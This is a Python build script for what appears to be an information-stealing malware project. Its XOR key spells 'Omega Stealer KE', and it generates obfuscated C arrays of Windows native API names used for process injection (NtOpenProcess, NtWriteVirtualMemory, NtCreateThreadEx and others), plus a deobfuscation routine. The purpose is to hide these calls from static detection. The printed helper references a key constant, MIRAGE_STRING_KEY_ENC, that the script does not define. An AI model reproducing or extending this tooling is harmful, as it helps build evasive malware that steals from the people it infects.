#!/usr/bin/env python3
"""Generate XOR-obfuscated string arrays for engine.c fallback exports."""
import sys

KEY = bytes([
    0x4f, 0x6d, 0x65, 0x67, 0x61, 0x20, 0x53, 0x74,
    0x65, 0x61, 0x6c, 0x65, 0x72, 0x20, 0x4b, 0x45
])

STRINGS = [
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtFreeVirtualMemory",
    "NtWriteVirtualMemory",
    "NtReadVirtualMemory",
    "NtClose",
    "NtQuerySystemInformation",
    "NtQueryInformationProcess",
    "NtDelayExecution",
    "NtOpenFile",
    "NtWriteFile",
    "NtSetInformationProcess",
    "NtOpenKey",
    "NtQueryValueKey",
    "NtOpenProcess",
    "NtCreateThreadEx",
    "NtFlushInstructionCache",
    "NtCreateEvent",
    "NtDeleteFile",
    "NtSetInformationFile",
    "NtCreateFile",
    "ntdll.dll",
]

def xor_string(s):
    return bytes(ord(s[i]) ^ KEY[i % len(KEY)] for i in range(len(s)))

def c_array(name, data):
    hex_bytes = ", ".join(f"0x{b:02x}" for b in data)
    return f"static const unsigned char _{name}_obf[{len(data)}] = {{ {hex_bytes} }};"

for s in STRINGS:
    obf = xor_string(s)
    var_name = s.replace('.', '_')
    print(c_array(var_name, obf))
    print()

print("/* Deobfuscation helper */")
print("static void deobf_str(const unsigned char *obf, size_t len, char *out) {")
print("    for (size_t i = 0; i < len; i++)")
print("        out[i] = (char)(obf[i] ^ MIRAGE_STRING_KEY_ENC[i % 16]);")
print("    out[len] = '\\0';")
print("}")
